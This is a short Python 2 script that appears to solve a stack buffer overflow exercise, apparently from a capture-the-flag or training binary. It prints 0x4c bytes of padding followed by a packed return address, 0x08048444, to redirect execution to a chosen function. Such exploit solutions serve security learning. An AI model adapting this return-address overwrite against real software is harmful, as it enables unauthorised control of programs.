#!/usr/bin/env python2
import struct

# 0x40 + argc + argv + ebp
padd = 'a' * 0x4c
run_func = struct.pack("<I", 0x08048444)
print padd + run_func
